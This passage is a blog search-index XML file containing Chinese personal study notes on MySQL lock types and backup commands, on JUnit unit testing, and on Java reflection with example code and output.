<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java 集合</title>
      <link href="/2024/08/08/java4/"/>
      <url>/2024/08/08/java4/</url>
      
        <content type="html"><![CDATA[<h1>集合进阶</h1>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 锁</title>
      <link href="/2024/08/06/mysql11/"/>
      <url>/2024/08/06/mysql11/</url>
      
        <content type="html"><![CDATA[<h1>锁</h1><h2 id="概述">概述</h2><p>锁是计算机调解多个进程或者并发访问某一资源的机制</p><p>分类：</p><ul><li>全局锁 锁住所有表</li><li>表级锁 锁住整张表</li><li>行级锁 锁住整个行的数据</li></ul><h2 id="全局锁">全局锁</h2><p>对整个数据库的实例进行加锁，整个实例处于只读状态</p><p>dml 和ddl语句都会阻塞</p><p>数据备份的时候会引发全局锁，从而获得一致性视图，来保证数据的完整性</p><p>加全局锁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flush tables with read lock;//开锁</span><br><span class="line">mysqldump -u -p itcast&gt;itcast.sql;//备份</span><br><span class="line">unlock tables;//关锁</span><br></pre></td></tr></table></figure><p>在主库上备份，在备份期间都不能更新</p><p>在从库上备份，在备份期间不能执行从主库同步过来的二进制日志，会有主从延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump --single-transaction -uroot -p123 itcast &gt; itcast.sql</span><br></pre></td></tr></table></figure><p>这样就能在innnodb引擎上完成不加锁的一致性数据备份</p><h2 id="表级锁">表级锁</h2><p>锁住整张表，锁定的颗粒大</p><p>分类—</p><ul><li>表级锁<ul><li>表共享读锁 可以读取不能写入</li><li>表独占写锁 其他的客户端不能写也不能读，但是当前客户端可以读也可以写</li></ul></li><li>元数据锁</li><li>意向锁</li></ul><p>表级：</p><p>加锁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lock tables name....read/write</span><br></pre></td></tr></table></figure><p>释放锁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlock tables</span><br></pre></td></tr></table></figure><p>元数据锁：</p><p>在表上有活动事务的时候，不能对元数据进行写入操作。伪类避免dml和ddl冲突</p><p>对表增删改查的时候会自动加上mdl读锁（共享的）。对表结构进行变更的时候加mdl写锁（排他的）</p><p><strong>共享锁之间是兼容的，排他锁是不能够兼容的</strong></p><p>意向锁：</p><p>为了解决表锁和行锁的冲突，用意向锁来简化检查</p><p>意向共享锁和表锁共享锁是兼容的，与表锁排他锁互斥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ...lock in share mode</span><br></pre></td></tr></table></figure><p>意向排他锁和表锁的两种所互斥，意向锁之间不会互斥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert update delete select...for update</span><br></pre></td></tr></table></figure><p>查询意向锁和行锁的sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.innodb_locks;</span><br><span class="line">SHOW ENGINE INNODB STATUS;</span><br></pre></td></tr></table></figure><h2 id="行级锁">行级锁</h2><p>每次锁住的是数据行，锁定颗粒度最小，发生锁冲突的概率最低，并发度最高。</p><p>innodb的数据是根据索引组织的，行锁是通过索引上的索引项进行加锁的</p><p>分类</p><ul><li>行锁，锁的是单行记录防止其他的update delete rr pr隔离级别都支持</li><li>间隙锁，锁定索引之间的间隙。防止其他事务对这个间隙insert，从而产生幻读。rr支持</li><li>临键锁，行锁和间隙锁组合，同时锁住数据和数据前面的间隙Gap,在rr隔离级别下支持</li></ul><p>行锁：</p><p>共享锁：共享锁之间是兼容的</p><p>排他锁：允许排他锁的事务更新，组织其他数据获得相同的共享锁和排他锁</p><ul><li><p>insert update delete自动加排他锁</p></li><li><p>select不加锁</p></li><li><p>lock in share mode共享锁</p></li><li><p>for update 排他锁</p></li></ul><p><strong>在innodb中的行锁是根据索引加的锁，不通过索引检索数据，Inoodb将会升级为表锁</strong></p><p>间隙锁/临键锁：</p><p>在默认情况下innodb使用的是rr事务隔离级别，innodb会使用next-key锁进行搜索和扫描来防止幻读</p><p><strong>间隙锁是可以共存的</strong></p><ul><li>唯一索引，给不存在的记录加锁时，优化为间隙锁</li><li>普通索引，向右遍历的最后一个指不满足查询条件，next-key退化为间隙锁</li><li>范围索引（唯一索引）会访问到不满足条件的第一个值为止</li></ul>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 进阶</title>
      <link href="/2024/08/04/java3/"/>
      <url>/2024/08/04/java3/</url>
      
        <content type="html"><![CDATA[<h1>java 进阶</h1><h2 id="单元测试">单元测试</h2><p>针对最小的功能单元（方法）编写代码对其进行正确性测试</p><p>junit单元测试框架</p><ul><li><p>灵活的编写测试代码，可以单个测试，也可以一键完成</p></li><li><p>还会生成测试报告</p></li></ul><p>步骤：</p><ul><li>为需要测试的业务类，定义编写对应的测试类。（公共无参数无返回值）</li><li>测试方法必须声明@Test注解</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.example.aaa;</span><br><span class="line"></span><br><span class="line">import org.junit.Test;</span><br><span class="line">import static org.junit.Assert.*;</span><br><span class="line"></span><br><span class="line">public class test1 &#123;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void testtest1() &#123;</span><br><span class="line">        // 这里是测试逻辑，例如断言</span><br><span class="line">        assertTrue(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例如</p><h3 id="断言">断言</h3><p>最核心的，预测的一种机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assertEquals(&#x27;方法内部有BUG&#x27;, 4, 5);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p><code>assertEquals</code> 是 JUnit 中的一个静态方法，用于验证两个值是否相等。</p></li><li><p><code>'方法内部有BUG'</code> 是一个字符串，这是在断言失败时会显示的错误消息。</p></li><li><p><code>4</code> 是期望值 (expected value)。</p></li><li><p><code>5</code> 是实际值 (actual value)。</p></li></ul><h3 id="注解">注解</h3><ul><li>@Test</li><li>@Before 修饰一个实例方法，在每一个测试方法执行前执行一次</li><li>@After 修饰一个实例方法，在每一个测试方法执行后执行一次</li><li>@BeforeClass 修饰一个静态方法，在所有测试方法之前执行一次</li><li>@AfterClass 修饰一个静态方法，在所有测试方法之后执行一次</li></ul><p>在5.0以后的版本后</p><p>@Before变成了BeforeEach</p><p>@BeforeClass变成了BeforeAll</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java go1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反转字符串</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseString</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(input).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javago;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringUtilsTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReverseString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StringUtils</span> <span class="variable">utils</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringUtils</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试空字符串</span></span><br><span class="line">        assertEquals(<span class="string">&quot;&quot;</span>, utils.reverseString(<span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试一般字符串</span></span><br><span class="line">        assertEquals(<span class="string">&quot;dcba&quot;</span>, utils.reverseString(<span class="string">&quot;abcd&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试单个字符</span></span><br><span class="line">        assertEquals(<span class="string">&quot;a&quot;</span>, utils.reverseString(<span class="string">&quot;a&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试 null</span></span><br><span class="line">        assertNull(utils.reverseString(<span class="literal">null</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我发现测试通过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ikeife\.jdks\corretto-21.0.3\bin\java.exe -ea -Didea.test.cyclic.buffer.size=1048576 &quot;-javaagent:D:\IntelliJ IDEA 2023.3.7\lib\idea_rt.jar=52251:D:\IntelliJ IDEA 2023.3.7\bin&quot; -Dfile.encoding=UTF-8 -Dsun.stdout.encoding=UTF-8 -Dsun.stderr.encoding=UTF-8 -classpath &quot;D:\IntelliJ IDEA 2023.3.7\lib\idea_rt.jar;D:\IntelliJ IDEA 2023.3.7\plugins\junit\lib\junit5-rt.jar;D:\IntelliJ IDEA 2023.3.7\plugins\junit\lib\junit-rt.jar;E:\work-testroot\study\java\javago\out\production\java go1;C:\Users\ikeife\.m2\repository\org\jetbrains\kotlin\kotlin-stdlib-jdk8\1.9.23\kotlin-stdlib-jdk8-1.9.23.jar;C:\Users\ikeife\.m2\repository\org\jetbrains\kotlin\kotlin-stdlib\1.9.23\kotlin-stdlib-1.9.23.jar;C:\Users\ikeife\.m2\repository\org\jetbrains\annotations\13.0\annotations-13.0.jar;C:\Users\ikeife\.m2\repository\org\jetbrains\kotlin\kotlin-stdlib-jdk7\1.9.23\kotlin-stdlib-jdk7-1.9.23.jar;C:\Users\ikeife\.m2\repository\junit\junit\4.13.1\junit-4.13.1.jar;C:\Users\ikeife\.m2\repository\org\hamcrest\hamcrest-core\1.3\hamcrest-core-1.3.jar&quot; com.intellij.rt.junit.JUnitStarter -ideVersion5 -junit4 javago.StringUtilsTest</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br></pre></td></tr></table></figure><h2 id="反射">反射</h2><p>加载类，并允许以编程的方式解剖类中的各种成分（成员变量。方法，构造器）</p><p>如何获取类的信息并操作他们</p><ul><li>加载类，获取字节码：获取了class对象</li><li>获取类的构造器 Constructor对象</li><li>获取类的成员变量 Field对象</li><li>获取类的成员方法 Method对象</li></ul><p>应用场景：</p><p>获取Class对象</p><ul><li><p>Class c1 = 类名.class</p></li><li><p>调用Class提供方法：public static Class forName(String package);</p></li><li><p>Object提供的方法：public Class getClass(); Class c3 = 对象.getClass();</p><p>Test1Class.java(三种方法都有了)</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package javahight;</span><br><span class="line"></span><br><span class="line">public class Test1Class&#123;</span><br><span class="line">    public static void main(String[] arges)&#123;</span><br><span class="line">        Class c1 = Students.class;</span><br><span class="line">        System.out.println(c1.getName());//运行可得javahight.Students是包名+类名 叫做全类名</span><br><span class="line">        System.out.println(c1.getSimpleName());//得到类名 Students</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        Class c2 = Class.forName(&quot;javahight.Students&quot;);</span><br><span class="line">        System.out.println(c1==c2);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        Students s = new Students();</span><br><span class="line">        Class c3 = s.getClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Students.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package javahight;</span><br><span class="line">class Students&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>获取类完成了</strong></p><h4 id="获取类的构造器">获取类的构造器</h4><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package javahight;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        testGetConstructor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void testGetConstructor() &#123;</span><br><span class="line">        Class&lt;?&gt; c = Students.class;//获取类</span><br><span class="line">        Constructor&lt;?&gt;[] constructors = c.getConstructors(); // 获取类的全部构造器</span><br><span class="line">        for (Constructor&lt;?&gt; constructor : constructors) &#123;//遍历所以</span><br><span class="line">            System.out.println(constructor.getName() + &quot; has &quot; + constructor.getParameterCount() + &quot; parameters&quot;);//输出</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个方法只能拿pubilc的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testGetConstructor</span><span class="params">()</span> &#123;</span><br><span class="line">        Class&lt;?&gt; c = Students.class;<span class="comment">//获取类</span></span><br><span class="line">        Constructor&lt;?&gt;[] constructors = c.getDeclaredConstructors(); <span class="comment">// 获取类的全部构造器</span></span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) &#123;<span class="comment">//遍历所以</span></span><br><span class="line">            System.out.println(constructor.getName() + <span class="string">&quot; has &quot;</span> + constructor.getParameterCount() + <span class="string">&quot; parameters&quot;</span>);<span class="comment">//输出</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>改成getDeclaredConstructors()就能拿到所有的</strong></p><p><strong>这个强烈推荐</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Cat.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor();</span><br></pre></td></tr></table></figure><p>这个也是只能拿pubilc的构造器</p><p>所以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Cat.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor();</span><br></pre></td></tr></table></figure><p>这样就能拿到除public之外的了</p><p>要获取的有参数</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="title function_">Students</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.name = name;</span><br><span class="line">     <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法是有参数的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br></pre></td></tr></table></figure><p>这样就能拿到有参数的构造器了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.newInstance;</span><br></pre></td></tr></table></figure><p>这个是有权限问题的</p><p>所以我们要加上暴力反射，禁止检查访问权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testGetConstructo</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Students.class;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> s.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//权限的禁用</span></span><br><span class="line">        <span class="type">Students</span> <span class="variable">students</span> <span class="operator">=</span> (Students) constructor.newInstance();</span><br><span class="line">        System.out.println(students);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样的话我们就能拿到无参的构造器</p><p>return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Students&#123;name=&#x27;null&#x27;, age=0&#125;</span><br></pre></td></tr></table></figure><p>如果用到有参数的，在参数的位置加上参数类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testGetConstructo</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Students.class;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> s.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Students</span> <span class="variable">students</span> <span class="operator">=</span> (Students) constructor.newInstance();</span><br><span class="line">        System.out.println(students);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> s.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Students</span> <span class="variable">students2</span>  <span class="operator">=</span> (Students) constructor2.newInstance(<span class="string">&quot;name&quot;</span>,<span class="number">6</span>);</span><br><span class="line">        System.out.println(students2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>return</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Students&#123;name=<span class="string">&#x27;null&#x27;</span>, age=<span class="number">0</span>&#125;</span><br><span class="line">Students&#123;name=<span class="string">&#x27;name&#x27;</span>, age=<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><p>如何没重写toString方法的话，那样只能回显一个内存的地址</p><p>所以要在Students加上toString方法</p><p><strong>重写 <code>toString</code> 方法</strong>:</p><ul><li>在 <code>Students</code> 类中添加 <code>toString</code> 方法，使其返回包含对象属性的字符串。这样可以确保在打印 <code>Students</code> 对象时，会显示对象的属性而不是默认的类名和内存地址。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Students&#123;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;, age=&quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="获取类的成员变量"><strong>获取类的成员变量</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static class Test &#123;</span><br><span class="line">        public void testGetFields() &#123;</span><br><span class="line">            Class&lt;?&gt; s = Students.class;//反射</span><br><span class="line">            Field[] fields = s.getDeclaredFields(); // 获取类的所有字段</span><br><span class="line">            for (Field field : fields) &#123;//变量输出</span><br><span class="line">                System.out.println(field.getName() + &quot; : &quot; + field.getType());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name : class java.lang.String</span><br><span class="line">age : int</span><br><span class="line">a : int</span><br><span class="line">country : class java.lang.String</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿之前的方法就也能拿到单个的成员变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field fname = s.getDeclaredField(&quot;name&quot;);</span><br><span class="line">System.out.println(fname.getName());</span><br></pre></td></tr></table></figure><p>return：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name</span><br></pre></td></tr></table></figure><p>接下来是为了成员变量赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">               Field fname = s.getDeclaredField(&quot;name&quot;);</span><br><span class="line">               System.out.println(fname.getName());</span><br><span class="line"></span><br><span class="line">               Students students = new Students();</span><br><span class="line">               fname.setAccessible(true);</span><br><span class="line">               fname.set(students, &quot;大&quot;); // 设置students对象的name字段</span><br><span class="line">               System.out.println(students); // 打印students对象，查看修改后的name字段</span><br><span class="line">           &#125; catch (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>最后回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name</span><br><span class="line">Students&#123;name=&#x27;大&#x27;, age=0&#125;</span><br></pre></td></tr></table></figure><h4 id="获取成员方法">获取成员方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void testGetFields() &#123;</span><br><span class="line">            Class s = Students.class;//反射第一步</span><br><span class="line">             Method[] methods = s.getDeclaredMethods();//获取方法</span><br><span class="line">             for(Method method : methods)&#123;//遍历输出</span><br><span class="line">                 System.out.println(method.getName() + &quot;---&quot; + method.getParameterCount() + &quot;---&quot; + method.getReturnType());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getA---0---int</span><br><span class="line">setAge---1---void</span><br><span class="line">getAge---0---int</span><br><span class="line">setA---1---void</span><br><span class="line">printStudentInfo---0---void</span><br><span class="line">getName---0---class java.lang.String</span><br><span class="line">toString---0---class java.lang.String</span><br><span class="line">setName---1---void</span><br><span class="line">getCountry---0---class java.lang.String</span><br></pre></td></tr></table></figure><p>拿取单个方法，定位需要方法名 方法的参数类型来定位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class s = Students.class;</span><br><span class="line">            String setAge;</span><br><span class="line">            Method method = s.getDeclaredMethod(&quot;getName&quot;);</span><br><span class="line">             System.out.println(method.getName() + &quot;---&quot; + method.getParameterCount() + &quot;---&quot; + method.getReturnType());</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getName---0---class java.lang.String</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static class Test &#123;</span><br><span class="line">        public void testInvokeMethod() throws Exception &#123;</span><br><span class="line">            Class&lt;?&gt; s = Students.class;</span><br><span class="line">            Method method = s.getDeclaredMethod(&quot;printStudentInfo&quot;);</span><br><span class="line"></span><br><span class="line">            Students students = new Students(&quot;Alice&quot;, 20);</span><br><span class="line">            method.setAccessible(true);</span><br><span class="line">            method.invoke(students);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;aaa&quot;);//触发执行</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: Alice, Age: 20, Country: china</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><h4 id="反射的作用">反射的作用</h4><p>适合做java的框架</p><p>简易框架的开发：</p><p>Test1Class.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 